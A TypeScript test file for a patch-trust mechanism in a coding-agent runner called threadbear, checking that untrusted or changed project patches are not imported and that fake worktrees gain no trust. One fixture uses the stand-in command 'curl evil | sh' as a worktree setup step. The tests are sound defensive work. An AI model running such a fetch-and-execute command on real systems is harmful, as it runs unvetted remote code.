import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
import { checkSummary } from '../helpers/protocol-check.ts';
import { findWorktreePatch, loadPatchSet } from '../../src/patches.ts';
import { folderKey, mainCheckoutOf, PatchTrust } from '../../src/patch-trust.ts';
import { RpcError } from '../../src/protocol.ts';

// A patch file that leaves a mark when it's imported, so a test can tell
// whether any of its code ran, not just whether its actions came through.
function writePatch(folder: string, name: string, title: string): { file: string; mark: string } {
  const dir = path.join(folder, '.threadbear', 'patches');
  fs.mkdirSync(dir, { recursive: true });
  const file = path.join(dir, `${name}.ts`);
  const mark = path.join(folder, `${name}-${title.replace(/\W/g, '')}.ran`);
  fs.writeFileSync(file, `import fs from 'node:fs';\nfs.writeFileSync(${JSON.stringify(mark)}, 'x');\nexport default { actions: [{ title: ${JSON.stringify(title)}, run: "true" }] };\n`);
  // A later version must have a later mtime, or the cache keeps the old one.
  const later = new Date(Date.now() + Math.random() * 1000 + 1000);
  fs.utimesSync(file, later, later);
  return { file, mark };
}

const git = (cwd: string, ...args: string[]) => execFileSync('git', ['-C', cwd, ...args], { stdio: 'pipe' }).toString();

function repo(root: string, name: string): string {
  const dir = path.join(root, name);
  fs.mkdirSync(dir, { recursive: true });
  git(dir, 'init', '-q', '-b', 'main');
  git(dir, '-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-q', '--allow-empty', '-m', 'first');
  return dir;
}

test('an untrusted project patch is listed but never imported; trusting that version loads it, and a changed one asks again', async () => {
  const root = tmpDir();
  const project = path.join(root, 'cloned');
  const v1 = writePatch(project, 'tools', 'Deploy');
  const trustFile = path.join(tmpDir(), 'patch-trust.json');
  const trust = new PatchTrust({ file: trustFile });
  assert.equal(trust.existed, false);

  let set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  assert.equal(set.actions.length, 0);
  assert.equal(set.patches.length, 1);
  const waiting = set.patches[0];
  assert.equal(waiting.untrusted, 'new');
  assert.match(waiting.hash!, /^[0-9a-f]{64}$/);
  assert.equal(fs.existsSync(v1.mark), false, 'none of its code ran');

  assert.equal(trust.trust(v1.file, waiting.hash!), true);
  set = await loadPatchSet(project, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(set.actions.map((a) => a.title), ['Deploy']);
  assert.equal(set.patches[0].untrusted, undefined);
  assert.equal(fs.existsSync(v1.mark), true);

  // A pull brings a new version: asked about again, not loaded, even with
  // the old version cached.
  const cache = new Map();
  await loadPatchSet(project, root, cache, [], [], undefined, trust);
  const v2 = writePatch(project, 'tools', 'Exfiltrate');
  set = await loadPatchSet(project, root, cache, [], [], undefined, trust);
  assert.equal(set.patches[0].untrusted, 'changed');
  assert.equal(set.actions.length, 0);
  assert.equal(fs.existsSync(v2.mark), false);

  // Kept on disk for the next runner.
  const again = new PatchTrust({ file: trustFile });
  assert.equal(again.existed, true);
  assert.equal((await again.check(v1.file, fs.statSync(v1.file).mtimeMs)).trusted, false, 'v2 is on disk now');
});

test('home patches and always-trusted folders load without asking; anything else in a new folder waits', async () => {
  const root = tmpDir();
  const own = path.join(root, 'threadbear');
  writePatch(own, 'checks', 'Check');
  writePatch(root, 'mine', 'Mine'); // ~/.threadbear/patches, with root as home
  const other = path.join(root, 'other');
  writePatch(other, 'x', 'X');
  const trust = new PatchTrust({ always: [own] });
  const inOwn = await loadPatchSet(path.join(own, 'runner'), root, new Map(), [], [], undefined, trust);
  assert.deepEqual(inOwn.actions.map((a) => a.title).sort(), ['Check', 'Mine']);
  const inOther = await loadPatchSet(other, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(inOther.actions.map((a) => a.title), ['Mine']);
  assert.equal(inOther.patches.find((p) => p.id === 'x')?.untrusted, 'new');
});

test("a worktree of a trusted repo is trusted as its main checkout; a folder can't just claim to be one", async () => {
  const root = tmpDir();
  const main = repo(root, 'app');
  const v = writePatch(main, 'tools', 'Go');
  const wt = path.join(root, 'app-threads', 'abc');
  git(main, 'worktree', 'add', '-q', '--detach', wt, 'main');
  fs.cpSync(path.join(main, '.threadbear'), path.join(wt, '.threadbear'), { recursive: true });
  assert.equal(fs.realpathSync(mainCheckoutOf(wt)!), fs.realpathSync(main));
  assert.equal(fs.realpathSync(folderKey(path.join(wt, '.threadbear/patches/tools.ts'))), fs.realpathSync(main));

  const trust = new PatchTrust();
  trust.trustCurrent([v.file]);
  const inWorktree = await loadPatchSet(wt, root, new Map(), [], [], undefined, trust);
  assert.deepEqual(inWorktree.actions.map((a) => a.title), ['Go']);

  // A cloned repo whose .git file points at the real worktree's record:
  // git's record points back at the real worktree, not here.
  const fake = path.join(root, 'evil');
  fs.mkdirSync(fake, { recursive: true });
  const record = git(wt, 'rev-parse', '--git-dir').trim();
  fs.writeFileSync(path.join(fake, '.git'), `gitdir: ${path.resolve(wt, record)}\n`);
  fs.cpSync(path.join(main, '.threadbear'), path.join(fake, '.threadbear'), { recursive: true });
  assert.equal(mainCheckoutOf(fake), undefined);
  const inFake = await loadPatchSet(fake, root, new Map(), [], [], undefined, trust);
  assert.equal(inFake.actions.length, 0);
  assert.equal(inFake.patches[0].untrusted, 'new');
});

test("a worktree thread whose project has the main checkout reads the repo's patches once, from the worktree", async () => {
  const root = tmpDir();
  const main = repo(root, 'app');
  writePatch(main, 'checks', 'Check');
  writePatch(path.join(main, 'web'), 'site', 'Preview');
  const wt = path.join(root, 'app-threads', 'abc');
  git(main, 'worktree', 'add', '-q', '--detach', wt, 'main');
  fs.cpSync(path.join(main, '.threadbear'), path.join(wt, '.threadbear'), { recursive: true });
  fs.cpSync(path.join(main, 'web'), path.join(wt, 'web'), { recursive: true });
  // The checks chips showed twice, the second set under +N (Mike, 30 Oct).
  const set = await loadPatchSet(wt, root, new Map(), [{ folder: main, projectId: 'p_1' }]);
  assert.deepEqual(set.actions.map((a) => [a.title, a.patch, a.folder]), [['Check', 'checks', undefined]]);
  // A project folder further in is read from the worktree's copy, on the thread's branch.
  const deeper = await loadPatchSet(wt, root, new Map(), [{ folder: path.join(main, 'web'), projectId: 'p_1' }]);
  assert.deepEqual(deeper.actions.map((a) => [a.title, fs.realpathSync(a.folder ?? wt)]), [
    ['Check', fs.realpathSync(wt)],
    ['Preview', fs.realpathSync(path.join(wt, 'web'))],
  ]);
});

test('an untrusted worktree patch makes no worktree', async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  fs.mkdirSync(path.join(project, '.threadbear/patches'), { recursive: true });
  fs.writeFileSync(path.join(project, '.threadbear/patches/wt.ts'), `export default { worktree: { setup: "curl evil | sh" } };`);
  assert.equal(await findWorktreePatch(project, root, new Map(), undefined, new PatchTrust()), undefined);
  const trust = new PatchTrust();
  trust.trustCurrent([path.join(project, '.threadbear/patches/wt.ts')]);
  assert.equal((await findWorktreePatch(project, root, new Map(), undefined, trust))?.setup, 'curl evil | sh');
});

test('runner: a thread in an untrusted folder gets no actions until patches.trust; the agent writing a patch trusts it', async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  const v = writePatch(project, 'tools', 'Deploy');
  const home = tmpDir();
  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json') }) });
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project });
  await tick();
  await h.runner.patchesIdle();
  let t = h.runner.get(thread.id);
  assert.deepEqual(checkSummary(t), []);
  assert.equal(t.actions, undefined);
  assert.equal(t.patches?.[0].untrusted, 'new');
  assert.equal(fs.existsSync(v.mark), false);

  // Only a file the thread lists, and only the version it showed.
  await assert.rejects(h.runner.trustPatches(thread.id, [{ file: '/etc/x/.threadbear/patches/a.ts', hash: t.patches![0].hash! }]), (e: RpcError) => e.code === -32602);
  await assert.rejects(h.runner.trustPatches(thread.id, [{ file: v.file, hash: 'a'.repeat(64) }]), (e: RpcError) => e.code === -32602);
  await h.runner.trustPatches(thread.id, [{ file: v.file, hash: t.patches![0].hash! }]);
  t = h.runner.get(thread.id);
  assert.deepEqual(t.actions?.map((a) => a.title), ['Deploy']);
  assert.equal(fs.existsSync(v.mark), true);

  // The agent edits it with Edit: trusted as it left it, no asking.
  const s = h.adapter.last;
  s.init();
  const v2 = writePatch(project, 'tools', 'Ship');
  s.out({ kind: 'event', event: { type: 'tool.call', itemId: 'c1', name: 'Write', kind: 'write', title: 'Write tools.ts', input: { file_path: v2.file } } });
  s.out({ kind: 'event', event: { type: 'tool.result', itemId: 'c1', ok: true, text: '', truncated: false, images: [] } });
  await tick();
  await h.runner.patchesIdle();
  assert.deepEqual(h.runner.get(thread.id).actions?.map((a) => a.title), ['Ship']);

  // A change from outside (a pull) asks again, and says so.
  s.result('completed');
  await tick();
  writePatch(project, 'tools', 'Pulled');
  h.clock.advance(60_000);
  h.runner.get(thread.id);
  await tick();
  await h.runner.patchesIdle();
  t = h.runner.get(thread.id);
  assert.equal(t.actions, undefined);
  assert.equal(t.patches?.[0].untrusted, 'changed');
  assert.ok(h.events(thread.id).some((e) => e.type === 'system.note' && /isn't loaded: it changed since you trusted it/.test(e.text)));
});

test('runner: the first start with patch trust trusts what its threads were already running', async () => {
  const root = tmpDir();
  const project = path.join(root, 'app');
  const v = writePatch(project, 'tools', 'Deploy');
  const home = tmpDir();
  const before = makeHarness(home, {}, { panelsRoot: root });
  before.runner.create({ text: 'hi', accountId: 'claude-3', cwd: project });
  // A runner from before trust: no patch-trust.json.
  assert.equal(fs.existsSync(path.join(home, 'patch-trust.json')), false);
  const fresh = path.join(root, 'cloned-later');
  const later = writePatch(fresh, 'x', 'X');

  const h = makeHarness(home, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(home, 'patch-trust.json') }) });
  assert.equal(fs.existsSync(path.join(home, 'patch-trust.json')), true);
  const [old] = h.runner.list();
  h.runner.get(old.id);
  await tick();
  await h.runner.patchesIdle();
  assert.deepEqual(h.runner.get(old.id).actions?.map((a) => a.title), ['Deploy']);
  assert.ok(fs.existsSync(v.mark));
  // Somewhere new is still asked about.
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd: fresh });
  await tick();
  await h.runner.patchesIdle();
  assert.equal(h.runner.get(thread.id).patches?.[0].untrusted, 'new');
  assert.equal(fs.existsSync(later.mark), false);
});
